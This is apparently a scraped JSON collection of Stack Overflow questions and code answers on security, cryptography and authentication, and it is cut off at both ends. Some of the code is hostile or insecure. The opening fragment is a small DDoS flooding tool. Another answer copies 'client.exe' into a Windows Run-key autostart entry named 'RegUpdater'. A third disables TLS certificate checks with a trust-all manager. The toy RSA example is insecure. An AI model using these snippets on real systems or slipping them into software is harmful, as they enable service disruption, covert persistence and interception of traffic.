        "body": "import PySimpleGUI as sg\nimport socket\nsg.theme('DarkAmber')   # Add a touch of color\n# All the content I have in my window\nlayout = [  [sg.Text('Simple Python DDOS Attack tool.')],\n            [sg.Text('Enter IP'), sg.InputText()],\n            [sg.Button('Attack'), sg.Button('Cancel')] ]\n# Create the Window\nwindow = sg.Window('DDOS Python.', layout)\n#.\nwhile True:\n    event, values = window.read()\n    print(event, values)\n    if event == sg.WIN_CLOSED or event == 'Cancel': # if user closes window or clicks cancel\n        break\n    elif event == 'Attack':\n        # The ddos\n        for i in range(1,100):\n            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n            s.connect((values[0],80))\n            data = b\"GET / HTTP 1.1\\r\\n\"*1000\n            s.send(data)\n            s.close()\nwindow.close()",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2020-12-10T01:22:10",
        "author": "Jason Yang"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/64020163/how-to-persistant-key-using-ksp-in-net",
    "title": "How to persistant key using KSP in .net?",
    "question_id": 64020163,
    "posted_date": "2020-09-22T22:27:38",
    "answers": [
      {
        "answer_id": 64056897,
        "body": "C#\n    CngKey key;\n    bool keyExists = CngKey.Exists(KEY_NAME);\n    if (!keyExists)\n    {\n        CngKeyCreationParameters parameters = new CngKeyCreationParameters()\n        {\n            ExportPolicy = CngExportPolicies.AllowPlaintextExport,\n            Provider = CngProvider.MicrosoftSoftwareKeyStorageProvider,\n            KeyUsage = CngKeyUsages.AllUsages\n        };\n        CngProperty property = new CngProperty(\"Length\", BitConverter.GetBytes(RSA_KEY_SIZE), CngPropertyOptions.None);\n        parameters.Parameters.Add(property);\nkey = CngKey.Create(CngAlgorithm.Rsa, KEY_NAME, parameters);\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2020-09-24T22:23:59",
        "author": "TerraReef"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63603994/using-grep-to-find-critical-vulnerabilities-in-report-file",
    "title": "Using grep to find CRITICAL vulnerabilities in report file",
    "question_id": 63603994,
    "posted_date": "2020-08-26T14:53:50",
    "answers": [
      {
        "answer_id": 63604236,
        "body": "$ cat reports.txt\n+------------------------------+---------------------+----------+--------------------------+--------------------------+--------------------------------------------------------------+\n|           LIBRARY            |  VULNERABILITY ID   | SEVERITY |    INSTALLED VERSION     |      FIXED VERSION       |                            TITLE                             |\n+------------------------------+---------------------+----------+--------------------------+--------------------------+--------------------------------------------------------------+\n| apt-CRITICAL                 | CVE-2020-3810       | MEDIUM   | 1.4.9                    | 1.4.10                   | Missing input validation in                                  |\n|                              |                     |          | CRITICAL                 |                          | the ar/tar implementations of-CRITICAL                       |\n|                              |                     |          |                          |                          | APT before version 2.1.2...                                  |\n+                              +---------------------+----------+                          +--------------------------+--------------------------------------------------------------+\n|                              | CVE-2011-3374       | CRITICAL |                          |                          | It was found that apt-key                                    |\n|                              |                     |          |                          |                          | in apt, all versions, do not                                 |\n|                              |                     |          |                          |                          | correctly...                                                 |\n+------------------------------+---------------------+----------+--------------------------+--------------------------+--------------------------------------------------------------+",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2020-08-26T15:09:59",
        "author": "John1024"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/63496923/breaking-cipher-text-using-frequency-analysis-crypt-analysis-technique",
    "title": "Breaking Cipher text using frequency analysis / crypt analysis technique",
    "question_id": 63496923,
    "posted_date": "2020-08-19T21:01:54",
    "answers": [
      {
        "answer_id": 64622868,
        "body": "from operator import itemgetter\nletterFrequency = [\n                   [12.00, 'E'], [9.10, 'T'],\n                   [8.12, 'A'], [7.68, 'O'],\n                   [7.31, 'I'], [6.95, 'N'],\n                   [6.28, 'S'], [6.02, 'R'],\n                   [5.92, 'H'], [4.32, 'D'],\n                   [3.98, 'L'], [2.88, 'U'],\n                   [2.71, 'C'], [2.61, 'M'],\n                   [2.30, 'F'], [2.11, 'Y'],\n                   [2.09, 'W'], [2.03, 'G'],\n                   [1.82, 'P'], [1.49, 'B'],\n                   [1.11, 'V'], [0.69, 'K'],\n                   [0.17, 'X'], [0.11, 'Q'],\n                   [0.10, 'J'], [0.07, 'Z']]\nplain_to_cipher = {\n       \"a\": \"l\", \"b\": \"f\",\n       \"c\": \"w\", \"d\": \"o\",\n       \"e\": \"a\", \"f\": \"y\",\n       \"g\": \"u\", \"h\": \"i\",\n       \"i\": \"s\", \"j\": \"v\",\n       \"k\": \"z\", \"l\": \"m\",\n       \"m\": \"n\", \"n\": \"x\",\n       \"o\": \"p\", \"p\": \"b\",\n       \"q\": \"d\", \"r\": \"c\",\n       \"s\": \"r\", \"t\": \"j\",\n       \"u\": \"t\", \"v\": \"q\",\n       \"w\": \"e\", \"x\": \"g\",\n       \"y\": \"h\", \"z\": \"k\",\n       }\ncipher_to_plain = {v: k for k, v in plain_to_cipher.items()}\nalphabet = \"qwertyuioplkjhgfdsazxcvbnm\"\nmessage = input(\"Enter message to encrypt: \")\nmessage = message.lower()\nciphertext = \"\"\nfor c in message:\n    if c not in alphabet:\n        ciphertext += c\n    else:\n        ciphertext += plain_to_cipher[c]\nprint(\"\\nRandom substitution Encryption is: \\n\\t{}\".format(ciphertext))\n# .......................................................................\n# calculate letter frequency of ciphertext\nletter_list = []\ncipher_len = 0\nfor c in ciphertext:\n    if c in alphabet:\n        cipher_len += 1\n        if c not in letter_list:\n            letter_list.append(c)\nletter_freq = []\nfor c in letter_list:\n    letter_freq.append([round(ciphertext.count(c) / cipher_len * 100, 2), c])\n# ....................................................................................\n# Now sort list and decrypt each instance of ciphertext according to letter frequency\nletter_freq = sorted(letter_freq, key=itemgetter(0), reverse=True)\ndecrypted_plaintext = ciphertext\nindex = 0\nfor f, c in letter_freq:\n    print(\"Replacing {} of freq {} with {}.\".format(c, f, letterFrequency[index][1]))\n    decrypted_plaintext = decrypted_plaintext.replace(c, letterFrequency[index][1])\n    index += 1\nprint(\"\\nThe Plaintext after decryption using frequency analysis: \\n\\t{}\".format(decrypted_plaintext))",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2020-10-31T10:39:15",
        "author": "KMG"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/61764251/token-storage-problems-symfony-5-custom-login-authenticator",
    "title": "Token Storage Problems Symfony 5 Custom Login Authenticator",
    "question_id": 61764251,
    "posted_date": "2020-05-12T20:21:25",
    "answers": [
      {
        "answer_id": 61783345,
        "body": "private $tokenStorage   = null;\nprivate $login          = null;\npublic function __construct(TokenStorageInterface $tokenStorage)\n{\n    $this->tokenStorage = $tokenStorage;\n}\n/**\n * @param  ContainerInterface      $container Symfony service container interface\n * @return ContainerInterface|null\n */\npublic function setContainer(\\Psr\\Container\\ContainerInterface $container): ?\\Psr\\Container\\ContainerInterface\n{\n    if ($this->tokenStorage instanceof TokenStorageInterface && $this->tokenStorage->getToken() instanceof TokenInterface && $this->tokenStorage->getToken()->getUser() instanceof Login) {\n        $this->login = $this->tokenStorage->getToken()->getUser();\n    }\n    return $container;\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2020-05-13T15:32:24",
        "author": "Adambean"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/60621819/which-java-api-from-the-azure-sdk-to-delete-a-networksecurityrule",
    "title": "Which Java API from the Azure SDK to delete a NetworkSecurityRule?",
    "question_id": 60621819,
    "posted_date": "2020-03-10T12:21:56",
    "answers": [
      {
        "answer_id": 60629882,
        "body": "public static void main(String[] args){\n String clientId = \"your sp appId\";\n       String secret = \"your sp password\";\n       String domain = \"your tenant domain\";\n       ApplicationTokenCredentials credentials = new ApplicationTokenCredentials(clientId, domain, secret,\n            AzureEnvironment.AZURE);\n       Azure azure = AzureAzure.configure().withLogLevel(LogLevel.BASIC).authenticate(credentials)\n            .withDefaultSubscription();\n       NetworkSecurityGroup group = azure.networkSecurityGroups().getById(\n            \"your nsg resource id\");\n\n       for(String i : group.securityRules().keySet()){\n            System.out.println(i);\n       }\n\n\t   group.update().withoutRule.apply();\n\t   group = azure.networkSecurityGroups().getById(\n            \"/subscriptions/e5b0fcfa-e859-43f3-8d84-5e5fe29f4c68/resourceGroups/testgroup/providers/Microsoft.Network/networkSecurityGroups/test0123\");\n       System.out.println(group.Name());\n       for(String i : group.securityRules().keySet()){\n            System.out.println(i);\n       }\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2020-03-11T01:43:20",
        "author": "Jim Xu"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/59070030/validating-hmacsha256-in-c",
    "title": "Validating HMACSHA256 in C#",
    "question_id": 59070030,
    "posted_date": "2019-11-27T07:15:34",
    "answers": [
      {
        "answer_id": 59089349,
        "body": "c#\nusing System;\nusing System.Security.Cryptography;\nusing System.Text;\npublic class Program\n{\n    public static void Main()\n    {\n\t\tvar bytes = Encoding.Unicode.GetBytes(\"1234567\");\n\t\tvar saltBytes = Convert.FromBase64String(\"U2zdbUmZXCeOLs0OuS9bhg==\");\n\t\tbyte[] inArray;\n\t\tvar hashAlgorithm = HashAlgorithm.Create(\"HMACSHA256\");\n\t\tvar algorithm = hashAlgorithm as KeyedHashAlgorithm;\n                    var keyedHashAlgorithm = algorithm;\n                    if (keyedHashAlgorithm.Key.Length == saltBytes.Length)\n                    {\n                        //if the salt bytes is the required key length for the algorithm, use it as-is\n                        keyedHashAlgorithm.Key = saltBytes;\n\t\t\t\t\t\tConsole.WriteLine(\"length is ok\");\n                    }\n                    else if (keyedHashAlgorithm.Key.Length < saltBytes.Length)\n                    {\n                        //if the salt bytes is too long for the required key length for the algorithm, reduce it\n                        var numArray2 = new byte[keyedHashAlgorithm.Key.Length];\n                        Buffer.BlockCopy(saltBytes, 0, numArray2, 0, numArray2.Length);\n                        keyedHashAlgorithm.Key = numArray2;\n\t\t\t\t\t\tConsole.WriteLine(\"salt byte too long\");\n                    }\n                    else\n                    {\n                        //if the salt bytes is too short for the required key length for the algorithm, extend it\n                        Console.WriteLine(\"salt byte to short\");\n\t\t\t\t\t\tvar numArray2 = new byte[keyedHashAlgorithm.Key.Length];\n                        var dstOffset = 0;\n                        while (dstOffset < numArray2.Length)\n                        {\n                            var count = Math.Min(saltBytes.Length, numArray2.Length - dstOffset);\n                            Buffer.BlockCopy(saltBytes, 0, numArray2, dstOffset, count);\n                            dstOffset += count;\n                        }\n                        keyedHashAlgorithm.Key = numArray2;\n                    }\n                    inArray = keyedHashAlgorithm.ComputeHash(bytes);\n\n\t\tvar hash = Convert.ToBase64String(inArray);\n\t\tConsole.WriteLine(hash);\n        var base64Hash = \"7hQ60TTq0ZiT/z+eu4bdzpmBcp5uYa70ZDxQPncEG0c=\";\n            if (hash == base64Hash)\n            {\n                Console.WriteLine(\"Success! Both hashes match!\");\n            }\n            else\n            {\n                Console.WriteLine(\"Passwords do not match.\");\n            }\n\t}\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2019-11-28T07:52:18",
        "author": "Wessel"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/57935505/trying-to-create-a-run-key-in-the-registry-using-python",
    "title": "Trying to create a run Key in the Registry using Python",
    "question_id": 57935505,
    "posted_date": "2019-09-14T08:31:01",
    "answers": [
      {
        "answer_id": 63671114,
        "body": "path = os.getcwd().strip('\\n')\nNull, userprof = subprocess.check_output('set USERPROFILE', shell=True, stdin=subprocess.PIPE,\n                                            stderr=subprocess.PIPE).decode().split('=')\ndestination = userprof.strip('\\n\\r') + '\\\\Documents\\\\' + 'client.exe'\nif not os.path.exists(destination):\n    shutil.copyfile(path + '\\client.exe', destination)\n    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", 0,  wreg.KEY_ALL_ACCESS)\n    wreg.SetValueEx(key,'RegUpdater', 0 , wreg.REG_SZ, destination)\n    key.Close()",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2020-08-31T08:47:02",
        "author": "parham"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/57601515/how-to-securely-accept-file-uploads-from-multiple-servers-that-i-control",
    "title": "How to securely accept file uploads from multiple servers that I control?",
    "question_id": 57601515,
    "posted_date": "2019-08-21T23:04:17",
    "answers": [
      {
        "answer_id": 58077951,
        "body": "<cftry>\n\t<!--- Add more MIME types as required ( .gif, .tif etc ) --->\n\t<cfset variables.allowMimeTypes =  { 'image/jpeg': {extension: 'jpg'}, 'image/png': {extension: 'png'} } />\n    <cffile action=\"\"upload\"\" filefield=\"\"image_ile\"\" destination=\"\"#GetTempDirectory()#\"\" mode=\"\"600\"\"\n            accept=\"\"#StructKeyList(variables.allowMimeTypes)#\"\" strict=\"\"true\"\"\n            nameconflict=\"\"makeunique\"\" />\n\t<cfcatch type=\"\"any\"\">\n\t\t<!--- Handle the error messages - Empty file (0 bytes file), Invalid MIME type or any other error --->\n\t\t<cfdump var=\"\"#cfcatch#\"\" />\n\t</cfcatch>\n</cftry>",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-09-24T06:11:23",
        "author": "Sree Reddy"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/57310088/how-to-set-a-bindingerrorprocessor-globally-for-all-my-spring-mvc-controllers",
    "title": "How to set a BindingErrorProcessor globally for all my Spring MVC controllers?",
    "question_id": 57310088,
    "posted_date": "2019-08-01T09:25:39",
    "answers": [
      {
        "answer_id": 57311625,
        "body": "@ControllerAdvice\npublic class MyAdvice {\n    @InitBinder\n    public void initBinder(WebDataBinder binder) {\n            binder.setBindingErrorProcessor(new BindingErrorProcessor() {\n            @Override\n            public void processMissingFieldError(String missingField, BindingResult bindingResult) {\n                log.info(\"missing field \" + missingField);\n            }\n            @Override\n            public void processPropertyAccessException(PropertyAccessException ex, BindingResult bindingResult) {\n                bindingResult.rejectValue(ex.getPropertyName(), \"label.input.error\", \"label.general.error\");\n                log.info(\"property access exc. \" + ex);\n            }\n    }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-08-01T10:46:05",
        "author": "wi2ard"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/56482205/how-to-authorize-and-sign-in-at-the-same-time",
    "title": "How to Authorize and sign in at the same time",
    "question_id": 56482205,
    "posted_date": "2019-06-06T13:10:27",
    "answers": [
      {
        "answer_id": 56484252,
        "body": "c#\nnamespace TaskWebApp.Controllers\n{\n[Authorize]\n    public class SomethingElseController : Controller\n    {\n       public async Task<ActionResult> Index(){\n           if(Session[\"foo\"] == null){ //there is no session data\n               await SignUpSignIn(\"/somethingelse\") //This goes to the account controller and applies permissions on the session\n           }\n           else\n           {\n               return View();\n           }\n        }\n       private async Task SignUpSignIn(string redirectLink = \"\")\n        {\n            var controller = DependencyResolver.Current.GetService<AccountController>();\n            controller.ControllerContext = new ControllerContext(Request.RequestContext, controller);\n            await controller.SignUpSignIn(redirectLink);\n        }\n    }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-06-06T15:54:24",
        "author": "Scott Anderson"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/55532661/webflux-security-login-failure-handler-does-not-work",
    "title": "Webflux security login failure handler does not work",
    "question_id": 55532661,
    "posted_date": "2019-04-05T05:50:15",
    "answers": [
      {
        "answer_id": 59133664,
        "body": "@Component\npublic class MyGlobalWebExceptionHandler extends DefaultErrorWebExceptionHandler {\n    @Override\n    protected RouterFunction<ServerResponse> getRoutingFunction(ErrorAttributes errorAttributes) {\n        return route(all(), this::renderErrorResponse);\n    }\n    @Override\n    protected Mono<ServerResponse> renderErrorResponse(ServerRequest request) {\n        ErrorRepresentation representation = createErrorRepresentation(request);\n        return ServerResponse\n                .status(representation.getError().getStatus())\n                .contentType(APPLICATION_JSON_UTF8)\n                .body(BodyInserters.fromObject(representation));\n    }\n    private ErrorRepresentation createErrorRepresentation(ServerRequest request) {\n        boolean includeStackTrace = isIncludeStackTrace(request, MediaType.ALL);\n        Map<String, Object> error = getErrorAttributes(request, includeStackTrace);\n        Throwable throwable = getError(request);\n        if (throwable instanceof AuthenticationException) {\n            AuthenticationFailureException failureException = new AuthenticationFailureException(throwable.getMessage());\n            return new ErrorRepresentation(failureException, error.get(\"path\").toString());\n        }\n    }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-12-02T01:27:14",
        "author": "Yun Teng"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/55457930/get-current-logged-user-sid-with-no-admin-account",
    "title": "Get current logged user SID with no-admin account",
    "question_id": 55457930,
    "posted_date": "2019-04-01T10:49:24",
    "answers": [
      {
        "answer_id": 55471957,
        "body": "// Get first user\nManagementObject[] arr = new ManagementObject[1];\nUsers.CopyTo(arr, 0);\nManagementObject User = arr[0];\n// Found the %appData%\nconst string regValueLocalAppData = @\"AppData\";\nconst string regKeyShellFolders = @\"HKEY_USERS\\$SID$\\Software\\Microsoft\\Windows\\\" +\n                                                  @\"CurrentVersion\\Explorer\\Shell Folders\";\nvar localAppDataPath = Microsoft.Win32.Registry.GetValue(regKeyShellFolders.Replace(\"$SID$\", User[\"SID\"].ToString()), regValueLocalAppData, null) as string;\n// Check if %appData% is not empty// Le dossier %appData% existe\nif (!string.IsNullOrWhiteSpace(localAppDataPath))\n{\n    PathToRoaming = localAppDataPath;\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2019-04-02T06:00:19",
        "author": "DDbout"
      },
      {
        "answer_id": 55471957,
        "body": "public string GetAppdataPath() {\n\tstring PathToRoaming = \"\";\n\tITerminalServicesManager manager = new TerminalServicesManager();\n\tITerminalServicesSession session = manager.CurrentSession;\n\t// Get path to Users directory\n\tGuid UserProfilesGuid = new Guid(\"0762D272-C50A-4BB0-A382-697DCD729B80\");\n\tIntPtr pPath;\n\tSHGetKnownFolderPath(UserProfilesGuid, 0, IntPtr.Zero, out pPath);\n\tstring PathToUsers = System.Runtime.InteropServices.Marshal.PtrToStringUni(pPath);\n\tSystem.Runtime.InteropServices.Marshal.FreeCoTaskMem(pPath);\n\t// Build path\n\tstring PathToRoamingDir = String.Format(\"{0}\\\\{1}\\\\AppData\\\\Roaming\", PathToUsers, session.UserName);\n   if (Directory.Exists(PathToRoamingDir))\n   {\n      PathToRoaming = PathToRoamingDir;\n   }\n}\n[System.Runtime.InteropServices.DllImport(\"shell32.dll\")]\nstatic extern int SHGetKnownFolderPath([System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.LPStruct)] Guid rfid, uint dwFlags, IntPtr hToken, out IntPtr pszPath);",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2019-04-02T06:00:19",
        "author": "DDbout"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/54933039/how-to-encrypt-decrypt-a-text-by-using-rsa-method",
    "title": "How to encrypt / decrypt a text by using RSA method?",
    "question_id": 54933039,
    "posted_date": "2019-02-28T14:37:15",
    "answers": [
      {
        "answer_id": 54934722,
        "body": "import java.util.*;\nimport java.math.*;\npublic class Rsa {\n    private static final Scanner sc = new Scanner(System.in);\n    private int p, q, n, z, d = 0, e, i;\n    public Rsa() {\n        System.out.println(\"Enter 1st prime number p\");\n        p = sc.nextInt();\n        System.out.println(\"Enter 2nd prime number q\");\n        q = sc.nextInt();\n        n = p * q;\n        z = (p - 1) * (q - 1);\n        System.out.println(\"the value of z = \" + z);\n        for (e = 2; e < z; e++) {\n            if (gcd(e, z) == 1) // e is for public key exponent\n            {\n                break;\n            }\n        }\n        //e should be in the range 1-z\n        System.out.println(\"the value of e = \" + e);\n        // calculate d\n        for (i = 0; i <= 9; i++) {\n            int x = 1 + (i * z);\n            if (x % e == 0) //d is for private key exponent\n            {\n                d = x / e;\n                break;\n            }\n        }\n        System.out.println(\"the value of d = \" + d);\n    }\n    private static int gcd(int e, int z) {\n        if (e == 0) {\n            return z;\n        } else {\n            return gcd(z % e, e);\n        }\n    }\n    double encrypt(int msg) {\n        //Encrypting  C = msg ^e mod n\n        return (Math.pow(msg, e)) % n;\n    }\n    double[] encrypt(String msg) {\n        int[] charactersAsNumbers = new int[msg.length()];\n        for(int i = 0; i < msg.length(); i++) {\n            charactersAsNumbers[i] = msg.codePointAt(i);\n        }\n        System.out.println(\"Plain text as sequence of numbers: \" + Arrays.toString(charactersAsNumbers));\n        double[] encryptedMsg = new double[msg.length()];\n        for(int i = 0; i < charactersAsNumbers.length; i++) {\n            encryptedMsg[i] = encrypt(charactersAsNumbers[i]);\n        }\n        return encryptedMsg;\n    }\n    BigInteger decrypt(double encrypted) {\n        //converting int value of n to BigInteger\n        BigInteger N = BigInteger.valueOf(n);\n        //converting float value of c to BigInteger\n        BigInteger C = BigDecimal.valueOf(encrypted).toBigInteger();\n        //Decrypt , P = C\u02c6d mod N , msgback = P\n        return (C.pow(d)).mod(N);\n    }\n    String decrypt(double[] encrypted) {\n        StringBuilder builder = new StringBuilder();\n        for(double encryptedCharacter: encrypted) {\n            BigInteger decryptedCharacter = decrypt(encryptedCharacter);\n            builder.append(Character.toChars(decryptedCharacter.intValue()));\n        }\n        return builder.toString();\n    }\n    public static void main(String args[]) {\n        System.out.println(\"Enter the text to be encrypted and decrypted\");\n        String msg = sc.nextLine();\n        Rsa rsa = new Rsa();\n        double[] c = rsa.encrypt(msg);\n        System.out.println(\"Encrypted message is: \" + Arrays.toString(c));\n        String msgBack = rsa.decrypt(c);\n        System.out.println(\"Decrypted message is: \" + msgBack);\n    }\n}",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2019-02-28T16:40:59",
        "author": "Adam Bukowiecki"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/54467978/how-to-properly-add-a-user-after-using-makerbundle-makeauth",
    "title": "How to properly add a user after using makerbundle make:auth",
    "question_id": 54467978,
    "posted_date": "2019-01-31T14:32:12",
    "answers": [
      {
        "answer_id": 54469225,
        "body": "<?php\nnamespace App\\DataFixtures;\nuse Doctrine\\Bundle\\FixturesBundle\\Fixture;\nuse Doctrine\\Common\\Persistence\\ObjectManage;\nuse Symfony\\Component\\Security\\Core\\Encoder\\UserPasswordEncoderInterface;\nuse App\\Entity\\User;\nclass UserFixtures extends Fixture\n{\n    public function __construct(UserPasswordEncoderInterface $encoder)\n    {\n        $this->encoder = $encoder;\n    }\n    public function load(ObjectManager $manager)\n    {\n        $numberOfUsers = 10;\n        for($i = 0; $i < $numberOfUsers; $i++) {\n             $user = new User();\n             $user->setUsername(sprintf('test%d', $i));\n             $user->addRole('ROLE_ADMIN');\n             $password = $this->encoder->encodePassword($user, 'pass_1234');\n             $user->setPassword($password);\n             $manager->persist($user);\n        }\n        $manager->flush();\n    }\n}\n?>",
        "score": 0,
        "is_accepted": true,
        "creation_date": "2019-01-31T16:05:26",
        "author": "William Bridge"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/52667042/java-unable-to-read-image-by-url",
    "title": "Java - Unable to read image by url",
    "question_id": 52667042,
    "posted_date": "2018-10-05T09:45:01",
    "answers": [
      {
        "answer_id": 58439186,
        "body": "TrustManager[] trustAllCerts = new TrustManager[]{\n     new X509TrustManager() {\n         @Override\n         public java.security.cert.X509Certificate[] getAcceptedIssuers()\n         {\n             return new X509Certificate[0];\n         }\n         @Override\n         public void checkClientTrusted(\n             java.security.cert.X509Certificate[] certs, String authType\n         ) {}\n         @Override\n         public void checkServerTrusted(\n             java.security.cert.X509Certificate[] certs, String authType\n         ) {}\n     }\n };\n try {\n     SSLContext sc = SSLContext.getInstance(\"SSL\");\n     sc.init(null, trustAllCerts, new java.security.SecureRandom());\n\n     HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n } catch (GeneralSecurityException e) {\n }",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2019-10-17T15:02:38",
        "author": "user4837435"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/43425281/spring-boot-spring-security-spring-oauth2",
    "title": "spring boot + spring security + spring-oauth2",
    "question_id": 43425281,
    "posted_date": "2017-04-15T07:06:27",
    "answers": [
      {
        "answer_id": 46350711,
        "body": "@Configuration\n@EnableResourceServer\nprotected static class ResourceServerConfiguration\n        extends ResourceServerConfigurerAdapter {\n    @Override\n    public void configure(ResourceServerSecurityConfigurer resources)\n            throws Exception {\n        // @formatter:off\n        resources\n            .resourceId(RESOURCE_ID);\n        // @formatter:on\n    }\n    @Override\n    public void configure(HttpSecurity http) throws Exception {\n         http.antMatcher(\"/me\") // or http.antMatcher(\"/user\")\n        .authorizeRequests().anyRequest().authenticated();\n    }\n}",
        "score": 0,
        "is_accepted": false,
        "creation_date": "2017-09-21T14:17:18",
        "author": "ManishSingh"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/27510849/spring-security-3-2-configuring-global-method-security-to-use-role-hierarchy",
    "title": "Spring Security 3.2 - configuring global method security to use role hierarchy",
    "question_id": 27510849,
    "posted_date": "2014-12-16T12:51:40",
    "answers": [
      {
        "answer_id": 73439570,
        "body": "@Override\n    protected AccessDecisionManager accessDecisionManager() {\n        var roleHierarchy = new RoleHierarchyImpl();\n        roleHierarchy.setHierarchy(\"ROLE_SUPER > ROLE_ADMIN\");\n\n        var expressionHandler = (DefaultMethodSecurityExpressionHandler) getExpressionHandler();\n        expressionHandler.setRoleHierarchy(roleHierarchy);\n        var expressionAdvice = new ExpressionBasedPreInvocationAdvice();\n        expressionAdvice.setExpressionHandler(expressionHandler);\n        return new AffirmativeBased(List.of(\n                new RoleHierarchyVoter(roleHierarchy),\n                new PreInvocationAuthorizationAdviceVoter(expressionAdvice),\n                new AuthenticatedVoter(),\n                new Jsr250Voter()\n        ));\n    }",
        "score": 1,
        "is_accepted": false,
        "creation_date": "2022-08-21T22:11:22",
        "author": "hurelhuyag"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/62753486/cross-site-scripting-vulnerability-in-c",
    "title": "Cross-Site Scripting vulnerability in C",
    "question_id": 62753486,
    "posted_date": "2020-07-06T05:52:11",
    "answers": [
      {
        "answer_id": 62753977,
        "body": "#include <string.h> // For strncmp\n#include <stdlib.h> // For malloc\nchar* clearUrl(char* input) {\n    // Part One: Remove occurrences at the beginning of the url\n    // --------------------------------------------------------\n    char* skippedStr = input;\n    while (1) {\n        if (*skippedStr == '/')\n            skippedStr ++;\n        else if (!strncmp(skippedStr, \"~/\", 2))\n            skippedStr += 2;\n        else if (!strncmp(skippedStr, \"./\", 2))\n            skippedStr += 2;\n        else if (!strncmp(skippedStr, \"../\", 3))\n            skippedStr += 3;\n        else\n            break;\n    }\n\n    // Part Two: remove occurrences of /.. within the url\n    // --------------------------------------------------\n    char* output = (char*) malloc( (strlen(skippedStr)+1) * sizeof(char));\n\n    char* cleanedStr = output;\n    while (*skippedStr != '\\0') {\n        if (!strncmp(skippedStr, \"/..\", 3))\n            skippedStr += 3;\n        else {\n            *cleanedStr = *skippedStr;\n            cleanedStr++;\n            skippedStr++;\n        }\n    }\n    *cleanedStr = '\\0'; // Append trailing null byte\n\n    return output;\n}",
        "score": -1,
        "is_accepted": false,
        "creation_date": "2020-07-06T06:20:01",
        "author": "fcdt"
      },
      {
        "answer_id": 62753977,
        "body": "    // ...\n    ent = gethostbyname(\"nicprimary\");\n    uname(&utname);\n    if (!getClientID(clientID)) {\n        cout << \"Content-type:  text/html\" << endl << endl;\n        cout << \"<HTML>\" << endl;\n        cout << \"<BODY>\" << endl;\n        cout << \"Security Violation:  error obtaining clientID\" << endl;\n        cout << \"</HTML>\" << endl;\n        cout << \"</BODY>\" << endl;\n        exit(0);\n    }\n    if ((qs = getenv(\"QUERY_STRING\")) == NULL) {\n        cout << \"Content-type:  text/html\" << endl << endl;\n        cout << \"<HTML>\" << endl;\n        cout << \"<BODY>\" << endl;\n        cout << \"No query information to decode.\" << endl;\n        cout << \"</HTML>\" << endl;\n        cout << \"</BODY>\" << endl;\n        exit(0);\n    }\n    // This is the new security check about occurences of ../ within qs\n    if (strstr(qs, \"../\")) {\n        cout << \"Status: 400 Bad Request\" << endl << endl;\n        exit(0);\n    }\n    cout << \"Content-type:  text/html\" << endl << endl;\n    // ...",
        "score": -1,
        "is_accepted": false,
        "creation_date": "2020-07-06T06:20:01",
        "author": "fcdt"
      }
    ]
  },
  {
    "url": "https://stackoverflow.com/questions/73958590/spring-security-with-user-password",
    "title": "Spring security with user/password",
    "question_id": 73958590,
    "posted_date": "2022-10-05T05:45:11",
    "answers": [
      {
        "answer_id": 73959901,
        "body": "@Service\npublic class CustomUserDetailsServiceImpl implements UserDetailsService {\n    private final UserRepository userRepository;\n    @Autowired\n    private PasswordEncoder passwordEncoder;\n    @Autowired\n    public CustomUserDetailsServiceImpl(UserRepository userRepository) {\n        this.userRepository = userRepository;\n    }\n    @Override\n    public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {\n        User user = userRepository.findByUsername(username);\n        if(user == null) {\n            throw ApiExceptionFactory.getApiException(ApiExceptionType.NOT_FOUND, \"user\");\n        }\n        return new org.springframework.security.core.userdetails.User(\n                user.getUsername(),\n                user.getPassword(),\n                user.getEnabled(),\n                true,\n                true,\n                true,\n                getAuthorities(user));\n    }\n    public Boolean isTokenValid(String token) {\n        try {\n            Jws<Claims> claimsJws = Jwts.parser().setSigningKey(SECRET.getBytes()).parseClaimsJws(token);\n            return true;\n        } catch (SignatureException | MalformedJwtException | UnsupportedJwtException | IllegalArgumentException ex) {\n            throw ApiExceptionFactory.getApiException(ApiExceptionType.LOGIN_FAILURE, \"invalid credentials\");\n        } catch (ExpiredJwtException ex) {\n            throw ApiExceptionFactory.getApiException(ApiExceptionType.LOGIN_FAILURE, \"token expired\");\n        }\n    }\n    @Transactional\n    public Boolean save(User user){\n        if(StringUtils.isEmpty(user.getUsername())) {\n            throw 